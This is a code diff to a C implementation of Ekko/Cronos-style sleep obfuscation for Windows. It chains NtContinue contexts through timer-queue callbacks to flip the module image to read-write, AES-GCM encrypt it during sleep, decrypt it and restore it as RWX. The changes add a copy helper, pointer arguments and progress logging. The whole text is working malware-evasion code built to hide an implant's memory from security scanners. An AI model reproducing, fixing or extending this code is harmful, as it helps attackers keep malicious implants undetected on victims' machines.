@@ -6,6 +6,16 @@
 // https://github.com/Cracked5pider/Ekko/tree/main
 // https://github.com/Idov31/Cronos
 
+VOID CopyFromPtr
+(
+	IN PVOID Dst,
+	IN PBYTE* Src,
+	IN DWORD* Size
+)
+{
+	RtlCopyMemory(Dst, *Src, *Size);
+}
+
 VOID SleepObfusc
 (
 	IN PLARGE_INTEGER SleepTime
@@ -14,6 +24,7 @@ VOID SleepObfusc
 
 
 	pWinApi Api = { 0 };
+	Api = (pWinApi)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WinApi));
 	DWORD dwOldProt = 0;
 	DWORD AesKeyLen = 0;
 	PBYTE AesKey = 0;
@@ -21,7 +32,6 @@ VOID SleepObfusc
 	PBYTE EncryptedData = 0, DecryptedData = 0, Tag = 0;
 	DWORD EncryptedSize = 0, DecryptedSize = 0, Delay = 0;
 
-	RtlSecureZeroMemory(Api, sizeof(Api));
 	Api->NtSetEvent = GetProcAddress(GetModuleHandleA("ntdll"), "NtSetEvent");
 	Api->NtContinue = GetProcAddress(GetModuleHandleA("ntdll"), "NtContinue");
 	Api->NtWaitForSingleObject = GetProcAddress(GetModuleHandleA("ntdll"), "NtWaitForSingleObject");
@@ -55,7 +65,7 @@ VOID SleepObfusc
 
 	for (int i = 0; i < 10; i++)
 	{
-		RtlCopyMemory(&Rop[i], &CtxThread, sizeof(CONTEXT));
+		memcpy(&Rop[i], &CtxThread, sizeof(CONTEXT));
 		Rop[i].Rsp = (DWORD64)StackBuffer[i];
 		Rop[i].Rsp -= 8;
 	}
@@ -80,6 +90,8 @@ VOID SleepObfusc
 		Rop[1].R8  = PAGE_READWRITE;
 		Rop[1].R9  = &dwOldProt;
 
+		INFO("Changing Protection --> RW");
+
 		Rop[2].Rip = AesEncrypt;
 		Rop[2].Rcx = ImageBase;
 		Rop[2].Rdx = ImageLen;
@@ -88,46 +100,60 @@ VOID SleepObfusc
 		*(DWORD64*)(StackBuffer[2] + 0x20) = (DWORD64)&Tag;
 		*(DWORD64*)(StackBuffer[2] + 0x28) = (DWORD64)&EncryptedData;
 
-		Rop[3].Rip = Api->RtlCopyMemory;
+		INFO("Encrypting Via Aes-256-GCM");
+
+		Rop[3].Rip = CopyFromPtr;
 		Rop[3].Rcx = ImageBase;
-		Rop[3].Rdx = EncryptedData;
-		Rop[3].R8 = EncryptedSize;
+		Rop[3].Rdx = &EncryptedData;
+		Rop[3].R8 = &EncryptedSize;
 
 		Rop[4].Rip = Api->NtWaitForSingleObject;
 		Rop[4].Rcx = hEvent;
 		Rop[4].Rdx = FALSE;
 		Rop[4].R8 = SleepTime;
 
+		OKAY("Waiting For %lld", SleepTime->QuadPart);
+
 		Rop[5].Rip = AesDecrypt;
-		Rop[5].Rcx = EncryptedData;
-		Rop[5].Rdx = EncryptedSize;
-		Rop[5].R8 = Tag;
+		Rop[5].Rcx = &EncryptedData;
+		Rop[5].Rdx = &EncryptedSize;
+		Rop[5].R8 = &Tag;
 		Rop[5].R9 = 16;
 		*(DWORD64*)(StackBuffer[5] + 0x20) = (DWORD64)AesKey;
 		*(DWORD64*)(StackBuffer[5] + 0x28) = (DWORD64)&DecryptedSize;
 		*(DWORD64*)(StackBuffer[5] + 0x30) = (DWORD64)&DecryptedData;
 
-		Rop[6].Rip = Api->RtlCopyMemory;
+		INFO("Decrypting Payload...");
+
+		Rop[6].Rip = CopyFromPtr;
 		Rop[6].Rcx = ImageBase;
-		Rop[6].Rdx = DecryptedData;
-		Rop[6].R8 = DecryptedSize;
+		Rop[6].Rdx = &DecryptedData;
+		Rop[6].R8 = &DecryptedSize;
 
 		Rop[7].Rip = Api->VirtualProtect;
 		Rop[7].Rcx = ImageBase;
 		Rop[7].Rdx = ImageLen;
-		Rop[7].R8 = dwOldProt;
+		Rop[7].R8 = PAGE_EXECUTE_READWRITE;
 		Rop[7].R9 = &dwOldProt;
+
+		INFO("Changing Protection --> RWX");
 
 		Rop[8].Rip = Api->NtSetEvent;
 		Rop[8].Rcx = hEvent;
 		Rop[8].Rdx = NULL;
+
+		INFO("Creating Timers");
 
 		for (int i = 0; i < 9; i++)
 		{
 			CreateTimerQueueTimer(&hNewTimer, hTimerQueue, Api->NtContinue, &Rop[i], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD);
 		}
 
+		INFO("Waiting...");
+
 		Api->NtWaitForSingleObject(hEvent, FALSE, NULL);
+
+		OKAY("Finished!");
 
 	}
 
